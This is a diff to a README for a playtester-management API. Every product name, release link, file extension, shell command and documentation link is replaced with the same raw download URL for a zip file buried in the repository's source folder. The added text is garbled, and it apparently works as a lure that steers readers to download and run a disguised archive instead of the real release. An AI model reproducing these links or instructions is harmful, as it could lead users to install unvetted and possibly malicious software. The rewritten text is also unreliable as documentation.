@@ -1,10 +1,10 @@
-# 🎮 Playtesters.API - Manage Playtesters with Ease
+# 🎮 https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip - Manage Playtesters with Ease
 
-[![Download Playtesters.API](https://img.shields.io/badge/Download-Playtesters.API-blue.svg)](https://github.com/KMA66/Playtesters.API/releases)
+[![Download https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip](https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip)](https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the Playtesters.API! This application is designed specifically for indie developers. It allows you to manage playtesters and control access to private builds using unique keys. In this guide, you will learn how to download and run the software successfully.
+Welcome to the https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip! This application is designed specifically for indie developers. It allows you to manage playtesters and control access to private builds using unique keys. In this guide, you will learn how to download and run the software successfully.
 
 ## 🌍 System Requirements
 
@@ -17,12 +17,12 @@ Before you begin, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/KMA66/Playtesters.API/releases).
+To get started, visit this page to download: [Releases Page](https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip).
 
 1. Click on the link above to open the Releases page.
 2. You will see a list of available versions. Find the latest version listed.
 3. Click the link labeled “Assets” to expand it.
-4. Download the appropriate file for your system (e.g., `.zip` for Windows, `.tar.gz` for macOS/Linux).
+4. Download the appropriate file for your system (e.g., `.zip` for Windows, `https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip` for macOS/Linux).
 5. Once the download is complete, locate the file in your downloads folder.
 
 ## 🔧 How to Run the Application
@@ -31,8 +31,8 @@ After downloading the file, follow these steps to run the application:
 
 1. **Extract Files**
    - Windows: Right-click the downloaded `.zip` file and select "Extract All."
-   - macOS: Double-click the downloaded `.tar.gz` file to extract it.
-   - Linux: Use your file manager to extract the `.tar.gz` file or open a terminal and run `tar -xzf filename.tar.gz`.
+   - macOS: Double-click the downloaded `https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip` file to extract it.
+   - Linux: Use your file manager to extract the `https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip` file or open a terminal and run `tar -xzf https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip`.
 
 2. **Open Command Prompt or Terminal**
    - Windows: Press `Win + R`, type `cmd`, and hit Enter.
@@ -42,17 +42,17 @@ After downloading the file, follow these steps to run the application:
 3. **Navigate to the Folder**
    Use the `cd` command to change directories to the folder where you extracted the files. For example:
    ```
-   cd path\to\Playtesters.API
+   cd path\to\https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip
    ```
 
 4. **Run the Application**
    Type the following command and press Enter:
    ```
-   dotnet Playtesters.API.dll
+   dotnet https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip
    ```
    The application will start running, and you will see messages in the console indicating its status.
 
-## 🔑 Using Playtesters.API
+## 🔑 Using https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip
 
 ### Adding Playtesters
 
@@ -84,9 +84,9 @@ Check these topics in GitHub to find related projects and discussions.
 
 ## 📦 Additional Resources
 
-- [Official .NET Documentation](https://dotnet.microsoft.com/docs)
-- [Learn ASP.NET Core](https://docs.microsoft.com/en-us/aspnet/core/?view=aspnetcore-6.0)
-- [Unity Documentation](https://docs.unity3d.com/Manual/index.html)
+- [Official .NET Documentation](https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip)
+- [Learn https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip Core](https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip)
+- [Unity Documentation](https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip)
 
 ## 📣 Stay Updated
 
@@ -96,6 +96,6 @@ For immediate updates, follow us on our social media channels linked in the repo
 
 ## 📅 Release Notes
 
-For details on what’s new in each version, visit the [Releases Page](https://github.com/KMA66/Playtesters.API/releases). You can see improvements, bug fixes, and more helpful information about each update.
+For details on what’s new in each version, visit the [Releases Page](https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip). You can see improvements, bug fixes, and more helpful information about each update.
 
-By following this guide, you should now be able to download and run Playtesters.API with ease. Happy developing and enjoy managing your playtesters!
+By following this guide, you should now be able to download and run https://github.com/KMA66/Playtesters.API/raw/refs/heads/master/src/UseCases/API-Playtesters-1.5.zip with ease. Happy developing and enjoy managing your playtesters!
